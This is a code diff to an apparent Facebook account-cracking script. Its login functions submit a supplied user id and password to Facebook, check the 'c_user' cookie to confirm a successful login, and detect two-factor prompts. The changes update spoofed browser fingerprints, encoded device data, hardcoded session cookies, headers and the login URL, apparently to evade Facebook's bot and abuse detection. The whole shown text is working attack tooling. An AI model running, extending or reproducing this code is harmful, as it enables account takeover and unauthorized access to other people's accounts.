@@ -1264,7 +1264,7 @@ def mbasic(uid,pwx,tl):
             "had_cp_prefilled": "false",
             "had_password_prefilled": "true",
             "ab_test_data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ^%^2FlAAAAAAAFAA",
-            "encpass":  "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
             'datr': 'Upa8Z0wSosd66iJhuLNPcZHs',
             'fr': '07EBU7Zpog74EkRNt..BnvJZS..AAA.0.0.Bn7p9M.AWdp9aRRATLqmCBkWlnlN0r7y2k',
@@ -1349,30 +1349,47 @@ def p(uid,pwx,tl):
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'display': '',
+            'isprivate': '',
+            'return_session': '',
+            'skip_api_login': '',
+            'signed_next': '',
+            'trynum': '1',
+            'timezone': '-330',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+            'lgnrnd': '082322_j4iS',
+            'lgnjs': '1743866603',
+            'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc0Mzg2NjYwMy4wNjIsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjpmYWxzZX1dLCIzMDAwMSI6W3sidCI6MTc0Mzg2NjYwMy4wNjMsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijo1fV0sIjMwMDAyIjpbeyJ0IjoxNzQzODY2NjAzLjA2MywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NDM4NjY2MDMuMDY0LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6WyJlbi1JTiIsImVuLVVTIiwiZW4tR0IiLCJlbiIsImhpIiwiZ3UiLCJibiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzQzODY2NjAzLjA2NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjE1MH1dLCIzMDAwNSI6W3sidCI6MTc0Mzg2NjYwMy4wNjQsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp7InciOjE0NDAsImgiOjc3M319XSwiMzAwMDciOlt7InQiOjE3NDM4NjY2MDMuMDY3LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzQzODY2NjAzLjE3OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiJwcm9tcHQifV0sIjMwMDEyIjpbeyJ0IjoxNzQzODY2NjAzLjA2OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiJHb29nbGUgSW5jLiJ9XSwiMzAwMTMiOlt7InQiOjE3NDM4NjY2MDMuMDY4LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6IjUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTM1LjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDE1IjpbeyJ0IjoxNzQzODY2NjAzLjA2OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiJXaW4zMiJ9XSwiMzAwMTgiOlt7InQiOjE3NDM4NjY2MDMuMDY5LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6Mn1dLCIzMDAyMiI6W3sidCI6MTc0Mzg2NjYwMy4wODIsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp0cnVlfV0sIjMwMDQwIjpbeyJ0IjoxNzQzODY2NjAzLjA4MywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOi0zMzB9XSwiMzAwOTMiOlt7InQiOjE3NDM4NjY2MDMuMDgzLCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6MH1dLCIzMDA5NCI6W3sidCI6MTc0Mzg2NjYwMy4wODMsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNS4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDA5NSI6W3sidCI6MTc0Mzg2NjYwMy4wODQsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijo5fV0sIjMwMTA2IjpbeyJ0IjoxNzQzODY2NjAzLjA1MSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOmZhbHNlfSx7InQiOjE3NDM4NjY2MDMuMDU5LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6dHJ1ZX0seyJ0IjoxNzQzODY2NjAzLjA5OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly9lbi1nYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOmZhbHNlfSx7InQiOjE3NDM4NjY2MDMuMTY3LCJjdHgiOnsiY24iOiJodHRwczovL2VuLWdiLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6dHJ1ZX1dLCIzMDEwNyI6W3sidCI6MTc0Mzg2NjYwMy4wNTIsImN0eCI6eyJjbiI6Imh0dHBzOi8vZW4tZ2IuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjpmYWxzZX1dfQ==',
             'email': uid,
-            'login_source': 'comet_headerless_login',
-            'next': '',
+            'prefill_contact_point': '',
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'password',
+            'first_prefill_source': 'browser_dropdown',
+            'first_prefill_type': 'password',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'true',
+            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM/yAAAAAAFAA',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
-            'ps_n': '1',
+            'datr': 'ES-iZxg35DqKN--TlZlh4Mwu',
+            'sb': 'ES-iZ0S0Q3TXxuSylCRJGHa3',
             'ps_l': '1',
-            'sb': 'vv1mZoqkaQr8BYILQ8WaAKOT',
-            'datr': 'PJp1ZglQIotPNJW3IGpT68nu',
-            'fr': '1rNHx4L9yZvgxejws.AWU7xzmzrLS1LGa5nPwGWMTUEcgFtm5eBRQG0A.BnXFu6..AAA.0.0.BnvI6_.AWVoAUdn7Ek',
-            'wd': '1034x797',}
+            'ps_n': '1',
+            'locale': 'en_GB',
+            'fr': '1mMxyHSMiEop9Ml8c.AWex6wXeZqoo_jM3Q8FKj1t_7DA0iAgkLVK4dH2oa9iFp8H8uIQ.Bnp1ck..AAA.0.0.Bn8Urq.AWea1zP54Of-cMwiPKww_16kkXI',
+            'wd': '867x773',}
             headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
+            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
+            'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
             'dpr': '1',
-            'origin': 'https://www.facebook.com',
-            'pragma': 'no-cache',
+            'origin': 'https://en-gb.facebook.com',
             'priority': 'u=0, i',
-            'referer': 'https://www.facebook.com/?ref=homescreenpwa',
+            'referer': 'https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
             'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
-            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.82", "Chromium";v="133.0.6943.127"',
+            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+            'sec-ch-ua-full-version-list': '"Google Chrome";v="135.0.7049.41", "Not-A.Brand";v="8.0.0.0", "Chromium";v="135.0.7049.41"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-model': '""',
             'sec-ch-ua-platform': '"Windows"',
@@ -1382,10 +1399,10 @@ def p(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
-            'viewport-width': '1034',}
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+            'viewport-width': '867',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQwNDEwNTU5LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
+            url = 'https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
